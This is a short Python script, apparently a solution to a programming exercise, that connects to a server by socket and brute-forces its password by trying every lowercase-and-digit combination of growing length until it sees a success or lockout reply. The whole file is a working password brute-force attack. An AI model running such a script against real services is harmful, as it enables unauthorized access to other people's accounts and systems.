import sys
import socket
import string
import itertools


def create_guesser(password_length: int):
    """
    Makes an iterator which generates all possible passwords (str) of a given
    length from the set of ASCII lowercase and numerical characters.

    :param password_length: (int)
    :returns: An iterator to be called via next() to return all possible
        combinations. (None if password_length < 1)
    """
    character_set = string.ascii_lowercase + '0123456789'

    if password_length < 1:
        return None
    else:
        return itertools.product(character_set, repeat=password_length)


def guess_all(guess_iterator, socket_object):
    """
    Uses a provided iterator to attempt to guess the password. Halts guessing
    if the server returns a success or a lockout.

    :param guess_iterator: An iterator object which returns a password guess
        (str) with every application of next().
    :param socket_object: A connected socket object, used to pass messages to
        the server.
    :return: If the password was guessed correctly returns the guess (str),
        None if no attempts succeeded, 'LOCKOUT' (str) if the server locked us
        out.
    """
    while True:
        try:
            guess = ''.join(next(guess_iterator))

            socket_object.send(bytes(guess, encoding='utf-8'))
            reply = socket_object.recv(1024).decode()

            if reply == 'Connection success!':
                return guess
            elif reply == 'Too many attempts':
                return 'LOCKOUT'

        except StopIteration:
            return None


def main():
    """
    Main function for the hacker program.
    """
    # get arguments from CL and type-wrangle
    _file, server_ip, server_port = sys.argv
    server_port = int(server_port)

    # establish connection
    with socket.socket() as sock:
        sock.connect((server_ip, server_port))

        guess_length = 1
        while True:
            guesser = create_guesser(guess_length)
            result = guess_all(guesser, sock)

            if result == 'LOCKOUT':
                break
            elif result is not None:  # this means success!
                print(result)
                break
            else:
                guess_length += 1


if __name__ == '__main__':
    main()
